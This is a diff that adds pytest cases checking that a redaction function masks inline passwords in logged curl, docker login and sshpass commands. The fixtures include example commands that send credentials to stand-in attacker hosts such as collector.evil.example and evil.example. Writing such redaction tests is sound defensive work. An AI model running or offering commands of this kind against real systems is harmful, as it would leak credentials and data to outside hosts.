@@ -1476,6 +1476,24 @@ def test_inline_curl_stdin_config_password_is_redacted(text: str) -> None:
 
 
 @pytest.mark.parametrize(
+    ("option", "entry", "expected"),
+    [
+        ("--config", "user = alice:hunter2", f"user = alice:{REDACTED_EVIDENCE_VALUE}"),
+        ("--netrc-file", "machine collector.evil login alice password hunter2", f"password {REDACTED_EVIDENCE_VALUE}"),
+    ],
+)
+def test_inline_curl_heredoc_password_is_redacted(option: str, entry: str, expected: str) -> None:
+    text = f"curl {option} - https://collector.evil.example/upload <<EOF\n{entry}\nEOF"
+
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "hunter2" not in redacted
+    assert expected in redacted
+    assert "collector.evil.example" in redacted
+    assert redacted.endswith("EOF")
+
+
+@pytest.mark.parametrize(
     "text",
     [
         "curl --netrc-file <(echo 'machine collector.evil login alice password hunter2') https://collector.evil/upload",
@@ -1647,6 +1665,57 @@ def test_docker_login_short_password_is_redacted(text: str) -> None:
     ],
 )
 def test_non_password_docker_options_are_preserved(text: str) -> None:
+    assert redact_evidence_string(text, max_chars=1000) == text
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "echo hunter2 | docker login -u alice --password-stdin registry.evil",
+        "docker login -u alice --password-stdin registry.evil <<< hunter2",
+        "docker login -u alice --password-stdin registry.evil <<EOF\nhunter2\nEOF",
+    ],
+)
+def test_docker_login_password_stdin_inline_sources_are_redacted(text: str) -> None:
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "hunter2" not in redacted
+    assert REDACTED_EVIDENCE_VALUE in redacted
+    assert "docker login" in redacted
+    assert "registry.evil" in redacted
+
+
+def test_docker_login_password_stdin_dynamic_source_is_preserved() -> None:
+    text = "aws ecr get-login-password | docker login --password-stdin registry.evil"
+
+    assert redact_evidence_string(text, max_chars=1000) == text
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "SSHPASS=hunter2 sshpass -e ssh user@evil.example",
+        "DEPLOY_PASS=hunter2 sshpass -eDEPLOY_PASS ssh user@evil.example",
+        "sshpass -f <(echo hunter2) ssh user@evil.example",
+    ],
+)
+def test_sshpass_inline_env_and_file_passwords_are_redacted(text: str) -> None:
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "hunter2" not in redacted
+    assert REDACTED_EVIDENCE_VALUE in redacted
+    assert "sshpass" in redacted
+    assert "user@evil.example" in redacted
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "SSHPASS=hunter2 other-command user@evil.example",
+        "sshpass -f /run/secrets/password ssh user@evil.example",
+    ],
+)
+def test_sshpass_non_inline_password_sources_are_preserved(text: str) -> None:
     assert redact_evidence_string(text, max_chars=1000) == text
 
 
